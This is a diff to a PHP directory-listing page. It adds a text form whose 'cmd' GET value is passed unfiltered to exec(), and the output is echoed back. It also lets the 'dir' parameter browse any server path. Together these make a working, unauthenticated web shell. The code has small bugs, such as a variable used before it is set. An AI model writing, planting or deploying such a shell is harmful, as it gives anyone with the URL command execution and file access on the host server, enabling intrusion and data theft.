@@ -32,19 +32,34 @@ function printPerms($file) {
 }
  
 
-$dir = "./";
-if (isset($_GET['dir'])) {
-	$dir = $_GET['dir'];
+$dir = $_GET['dir'];
+if ($dir == NULL or !is_dir($dir)) {
+	$dir = './';
 }
+$dir = realpath($dir.'/'.$value);
 
 $dirs = scandir($dir);
 echo "Viewing directory " . $dir . "<br><br>";
 foreach ($dirs as $key => $value) {
-	echo "<a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a> " . printPerms($dir.$value) . "<br>";
+	echo "<a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a> " . printPerms($dir) . "\n<br>";
 	
 }
 
+echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
+echo "<input type='text' name='cmd' autofocus>\n<input type='submit' value='Execute'>\n";
+echo "</form>";
+
+if (isset($_GET['cmd'])) {
+	echo "<br><br><b>Result of command execution: </b><br>";
+	exec($_GET['cmd'], $cmdresult);
+	foreach ($cmdresult as $key => $value) {
+		echo "$value \n<br>";
+	}
+}
 
 ?>
+
+
+
 
 </html>
